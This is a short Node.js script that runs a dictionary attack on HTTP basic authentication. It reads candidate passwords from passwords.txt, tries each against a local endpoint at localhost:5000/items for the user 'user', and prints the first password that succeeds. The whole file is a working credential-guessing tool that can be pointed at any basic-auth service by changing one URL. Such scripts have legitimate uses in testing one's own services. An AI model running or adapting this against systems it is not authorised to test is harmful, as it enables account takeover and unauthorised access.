import { readFileSync } from "fs";
import axios from "axios";

const URL = "http://localhost:5000/items";
const USER = "user";
const FILE = "passwords.txt";

const passwords = readFileSync(FILE, "utf-8")
  .split("\n")
  .map((p) => p.trim())
  .filter(Boolean);

async function test(pwd) {
  try {
    await axios.get(URL, { auth: { username: USER, password: pwd } });
    console.log(`FOUND: ${pwd}`);
    process.exit(0);
  } catch (e) {
    if (e.response?.status === 401) {
      process.stdout.write(".");
    } else {
      console.error(`Error: ${e.message}`);
    }
  }
}

(async () => {
  console.log(`Testing ${passwords.length} passwords...`);
  for (const p of passwords) {
    await test(p);
    await new Promise((r) => setTimeout(r, 50));
  }
  console.log("\nNot found.");
})();
